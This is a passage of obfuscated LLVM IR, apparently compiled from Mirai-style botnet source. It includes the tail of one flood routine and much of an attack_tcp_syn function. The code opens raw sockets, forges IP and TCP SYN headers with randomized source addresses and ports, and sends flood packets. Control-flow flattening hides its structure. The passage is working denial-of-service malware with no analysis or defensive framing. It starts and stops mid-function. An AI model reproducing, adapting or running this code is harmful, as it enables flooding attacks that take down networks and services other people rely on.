  %461 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %460, i32 0, i32 0
  %462 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %461, i32 0, i32 0
  store i16 2, i16* %462, align 4
  %463 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 9
  %465 = load i32, i32* %464, align 4
  %466 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %467 = load i32, i32* %11, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %466, i64 %468
  %470 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i32 0, i32 0
  %471 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %470, i32 0, i32 2
  %472 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %471, i32 0, i32 0
  store i32 %465, i32* %472, align 4
  %473 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %474 = load i32, i32* %11, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %476, i32 0, i32 0
  %478 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %477, i32 0, i32 1
  store i16 0, i16* %478, align 2
  %479 = load i32, i32* %12, align 4
  %480 = load i8*, i8** %33, align 8
  %481 = load i32, i32* %20, align 4
  %482 = sext i32 %481 to i64
  %483 = add i64 66, %482
  %484 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %485 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %486 = load i32, i32* %11, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %485, i64 %487
  %489 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %488, i32 0, i32 0
  %490 = bitcast %struct.sockaddr_in* %489 to %struct.sockaddr*
  store %struct.sockaddr* %490, %struct.sockaddr** %484, align 8
  %491 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %492 = load %struct.sockaddr*, %struct.sockaddr** %491, align 8
  %493 = call i64 @sendto(i32 %479, i8* %480, i64 %483, i32 16384, %struct.sockaddr* %492, i32 16)
  store i32 -914236400, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i32, i32* %11, align 4
  %496 = add nsw i32 %495, 1
  store i32 %496, i32* %11, align 4
  store i32 1317700748, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #6
  %499 = load i32, i32* %24, align 4
  %500 = sext i32 %499 to i64
  %501 = icmp sgt i64 %498, %500
  %502 = select i1 %501, i32 18237943, i32 -1346010907
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  store i32 -1930328390, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  store i32 307741515, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %504, %503, %497, %494, %427, %420, %394, %388, %384, %380, %374, %369, %363, %358, %343, %338, %334, %330, %309, %277, %271, %270, %269, %266, %250, %242, %236, %227, %223, %170, %166, %112, %106, %105, %102, %96, %95, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 24, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add nsw i64 %99, %101
  %103 = trunc i64 %102 to i32
  store i32 %103, i32* %29, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -1633217176, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1633217176, label %first
    i32 -1671364476, label %107
    i32 1867440059, label %108
    i32 1555247255, label %114
    i32 1757366703, label %117
    i32 -1379451409, label %118
    i32 506826633, label %124
    i32 1728698063, label %168
    i32 -236398759, label %172
    i32 -413185078, label %297
    i32 899946102, label %300
    i32 1494935138, label %301
    i32 -1817216137, label %302
    i32 906347522, label %308
    i32 1782641632, label %328
    i32 1855349720, label %349
    i32 1801686987, label %353
    i32 -1404600142, label %357
    i32 -818983280, label %362
    i32 1642607110, label %368
    i32 764261947, label %373
    i32 634840129, label %379
    i32 -149798673, label %384
    i32 -151906035, label %390
    i32 -424889172, label %394
    i32 1955964374, label %398
    i32 -996586551, label %402
    i32 -1063018926, label %406
    i32 -1443419673, label %410
    i32 -1820443552, label %416
    i32 252429917, label %454
    i32 -152545042, label %457
    i32 674372863, label %463
    i32 -1152547667, label %464
    i32 -1960548928, label %465
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %105 = icmp eq i32 %.reload, -1
  %106 = select i1 %105, i32 -1671364476, i32 1867440059
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 -1960548928, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %109 = load i32, i32* %12, align 4
  %110 = bitcast i32* %11 to i8*
  %111 = call i32 @setsockopt(i32 %109, i32 0, i32 3, i8* %110, i32 4) #6
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 1555247255, i32 1757366703
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %12, align 4
  %116 = call i32 @close(i32 %115)
  store i32 -1960548928, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1379451409, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %11, align 4
  %120 = load i8, i8* %7, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  %123 = select i1 %122, i32 506826633, i32 899946102
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call noalias i8* @calloc(i64 128, i64 1) #6
  %126 = load i8**, i8*** %13, align 8
  %127 = load i32, i32* %11, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8*, i8** %126, i64 %128
  store i8* %125, i8** %129, align 8
  %130 = load i8**, i8*** %13, align 8
  %131 = load i32, i32* %11, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8*, i8** %130, i64 %132
  %134 = load i8*, i8** %133, align 8
  %135 = bitcast i8* %134 to %struct.iphdr*
  store %struct.iphdr* %135, %struct.iphdr** %30, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i64 1
  %138 = bitcast %struct.iphdr* %137 to %struct.tcphdr*
  store %struct.tcphdr* %138, %struct.tcphdr** %31, align 8
  %139 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %139, i64 1
  %141 = bitcast %struct.tcphdr* %140 to i8*
  store i8* %141, i8** %32, align 8
  %142 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = and i8 %144, 15
  %146 = or i8 %145, 64
  store i8 %146, i8* %143, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = and i8 %149, -16
  %151 = or i8 %150, 5
  store i8 %151, i8* %148, align 4
  %152 = load i8, i8* %14, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 1
  store i8 %152, i8* %154, align 1
  %155 = call zeroext i16 @htons(i16 zeroext 60) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 2
  store i16 %155, i16* %157, align 2
  %158 = load i16, i16* %15, align 2
  %159 = call zeroext i16 @htons(i16 zeroext %158) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 3
  store i16 %159, i16* %161, align 4
  %162 = load i8, i8* %16, align 1
  %163 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 5
  store i8 %162, i8* %164, align 4
  %165 = load i8, i8* %17, align 1
  %166 = icmp ne i8 %165, 0
  %167 = select i1 %166, i32 1728698063, i32 -236398759
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  store i32 -236398759, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 6
  store i8 6, i8* %174, align 1
  %175 = load i32, i32* %28, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 8
  store i32 %175, i32* %177, align 4
  %178 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %179 = load i32, i32* %11, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 9
  store i32 %183, i32* %185, align 4
  %186 = load i16, i16* %18, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 0
  store i16 %187, i16* %189, align 4
  %190 = load i16, i16* %19, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = load i32, i32* %20, align 4
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = zext i16 %196 to i32
  %198 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 2
  store i32 %197, i32* %199, align 4
  %200 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -241
  %204 = or i16 %203, 160
  store i16 %204, i16* %201, align 4
  %205 = load i8, i8* %22, align 1
  %206 = sext i8 %205 to i16
  %207 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %208 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = and i16 %206, 1
  %211 = shl i16 %210, 13
  %212 = and i16 %209, -8193
  %213 = or i16 %212, %211
  store i16 %213, i16* %208, align 4
  %214 = load i8, i8* %23, align 1
  %215 = sext i8 %214 to i16
  %216 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %215, 1
  %220 = shl i16 %219, 12
  %221 = and i16 %218, -4097
  %222 = or i16 %221, %220
  store i16 %222, i16* %217, align 4
  %223 = load i8, i8* %24, align 1
  %224 = sext i8 %223 to i16
  %225 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = and i16 %224, 1
  %229 = shl i16 %228, 11
  %230 = and i16 %227, -2049
  %231 = or i16 %230, %229
  store i16 %231, i16* %226, align 4
  %232 = load i8, i8* %25, align 1
  %233 = sext i8 %232 to i16
  %234 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %233, 1
  %238 = shl i16 %237, 10
  %239 = and i16 %236, -1025
  %240 = or i16 %239, %238
  store i16 %240, i16* %235, align 4
  %241 = load i8, i8* %26, align 1
  %242 = sext i8 %241 to i16
  %243 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = and i16 %242, 1
  %247 = shl i16 %246, 9
  %248 = and i16 %245, -513
  %249 = or i16 %248, %247
  store i16 %249, i16* %244, align 4
  %250 = load i8, i8* %27, align 1
  %251 = sext i8 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %251, 1
  %256 = shl i16 %255, 8
  %257 = and i16 %254, -257
  %258 = or i16 %257, %256
  store i16 %258, i16* %253, align 4
  %259 = load i8*, i8** %32, align 8
  %260 = getelementptr inbounds i8, i8* %259, i32 1
  store i8* %260, i8** %32, align 8
  store i8 2, i8* %259, align 1
  %261 = load i8*, i8** %32, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %32, align 8
  store i8 4, i8* %261, align 1
  %263 = call i32 @rand_next()
  %264 = and i32 %263, 15
  %265 = add i32 1400, %264
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #7
  %268 = load i8*, i8** %32, align 8
  %269 = bitcast i8* %268 to i16*
  store i16 %267, i16* %269, align 2
  %270 = load i8*, i8** %32, align 8
  %271 = getelementptr inbounds i8, i8* %270, i64 2
  store i8* %271, i8** %32, align 8
  %272 = load i8*, i8** %32, align 8
  %273 = getelementptr inbounds i8, i8* %272, i32 1
  store i8* %273, i8** %32, align 8
  store i8 4, i8* %272, align 1
  %274 = load i8*, i8** %32, align 8
  %275 = getelementptr inbounds i8, i8* %274, i32 1
  store i8* %275, i8** %32, align 8
  store i8 2, i8* %274, align 1
  %276 = load i8*, i8** %32, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %32, align 8
  store i8 8, i8* %276, align 1
  %278 = load i8*, i8** %32, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %32, align 8
  store i8 10, i8* %278, align 1
  %280 = call i32 @rand_next()
  %281 = load i8*, i8** %32, align 8
  %282 = bitcast i8* %281 to i32*
  store i32 %280, i32* %282, align 4
  %283 = load i8*, i8** %32, align 8
  %284 = getelementptr inbounds i8, i8* %283, i64 4
  store i8* %284, i8** %32, align 8
  %285 = load i8*, i8** %32, align 8
  %286 = bitcast i8* %285 to i32*
  store i32 0, i32* %286, align 4
  %287 = load i8*, i8** %32, align 8
  %288 = getelementptr inbounds i8, i8* %287, i64 4
  store i8* %288, i8** %32, align 8
  %289 = load i8*, i8** %32, align 8
  %290 = getelementptr inbounds i8, i8* %289, i32 1
  store i8* %290, i8** %32, align 8
  store i8 1, i8* %289, align 1
  %291 = load i8*, i8** %32, align 8
  %292 = getelementptr inbounds i8, i8* %291, i32 1
  store i8* %292, i8** %32, align 8
  store i8 3, i8* %291, align 1
  %293 = load i8*, i8** %32, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 1
  store i8* %294, i8** %32, align 8
  store i8 3, i8* %293, align 1
  %295 = load i8*, i8** %32, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %32, align 8
  store i8 6, i8* %295, align 1
  store i32 -413185078, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i32, i32* %11, align 4
  %299 = add nsw i32 %298, 1
  store i32 %299, i32* %11, align 4
  store i32 -1379451409, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 1494935138, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1817216137, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %11, align 4
  %304 = load i8, i8* %7, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp slt i32 %303, %305
  %307 = select i1 %306, i32 906347522, i32 -152545042
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i8**, i8*** %13, align 8
  %310 = load i32, i32* %11, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8*, i8** %309, i64 %311
  %313 = load i8*, i8** %312, align 8
  store i8* %313, i8** %33, align 8
  %314 = load i8*, i8** %33, align 8
  %315 = bitcast i8* %314 to %struct.iphdr*
  store %struct.iphdr* %315, %struct.iphdr** %34, align 8
  %316 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i64 1
  %318 = bitcast %struct.iphdr* %317 to %struct.tcphdr*
  store %struct.tcphdr* %318, %struct.tcphdr** %35, align 8
  %319 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %320 = load i32, i32* %11, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 2
  %324 = load i8, i8* %323, align 4
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %325, 32
  %327 = select i1 %326, i32 1782641632, i32 1855349720
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %330 = load i32, i32* %11, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 1
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @ntohl(i32 %334) #7
  %336 = call i32 @rand_next()
  %337 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %338 = load i32, i32* %11, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i64 %339
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %340, i32 0, i32 2
  %342 = load i8, i8* %341, align 4
  %343 = zext i8 %342 to i32
  %344 = lshr i32 %336, %343
  %345 = add i32 %335, %344
  %346 = call i32 @htonl(i32 %345) #7
  %347 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 9
  store i32 %346, i32* %348, align 4
  store i32 1855349720, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %28, align 4
  %351 = icmp eq i32 %350, -1
  %352 = select i1 %351, i32 1801686987, i32 -1404600142
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = call i32 @rand_next()
  %355 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  store i32 -1404600142, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i16, i16* %15, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  %361 = select i1 %360, i32 -818983280, i32 1642607110
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 3
  store i16 %365, i16* %367, align 4
  store i32 1642607110, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i16, i16* %18, align 2
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 65535
  %372 = select i1 %371, i32 764261947, i32 634840129
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = call i32 @rand_next()
  %375 = and i32 %374, 65535
  %376 = trunc i32 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 0
  store i16 %376, i16* %378, align 4
  store i32 634840129, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i16, i16* %19, align 2
  %381 = zext i16 %380 to i32
  %382 = icmp eq i32 %381, 65535
  %383 = select i1 %382, i32 -149798673, i32 -151906035
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = call i32 @rand_next()
  %386 = and i32 %385, 65535
  %387 = trunc i32 %386 to i16
  %388 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 1
  store i16 %387, i16* %389, align 2
  store i32 -151906035, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %20, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -424889172, i32 1955964374
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 2
  store i32 %395, i32* %397, align 4
  store i32 1955964374, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i32, i32* %21, align 4
  %400 = icmp eq i32 %399, 65535
  %401 = select i1 %400, i32 -996586551, i32 -1063018926
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
